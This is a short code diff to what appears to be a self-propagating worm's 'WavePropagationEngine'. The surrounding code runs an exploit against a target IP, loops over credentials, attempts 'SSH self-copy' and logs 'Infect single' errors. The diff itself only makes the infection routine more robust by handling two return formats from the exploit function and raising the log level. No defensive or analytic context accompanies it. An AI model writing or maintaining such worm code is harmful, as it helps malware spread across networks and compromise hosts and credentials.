@@ -457,10 +457,15 @@ class WavePropagationEngine:
 
         # Run the exploit function
         try:
-            success, exploit_data = exploit_fn(target)
+            exploit_result = exploit_fn(target)
+            # Accept both contracts: bool (exploit_target) or (bool, dict) tuple
+            if isinstance(exploit_result, tuple) and len(exploit_result) == 2:
+                success, exploit_data = exploit_result
+            else:
+                success, exploit_data = bool(exploit_result), {}
             if success:
                 result["success"] = True
-                result["exploit_data"] = exploit_data
+                result["exploit_data"] = exploit_data if isinstance(exploit_data, dict) else {}
                 # Try to extract usable credentials
                 for user, pwd in credentials:
                     # Attempt SSH self-copy
@@ -478,7 +483,7 @@ class WavePropagationEngine:
                             result["credentials"] = (user, pwd)
                             break
         except Exception as e:
-            logger.debug(f"Infect single {ip} error: {e}")
+            logger.error(f"Infect single {ip} error: {e}")
 
         return result
 
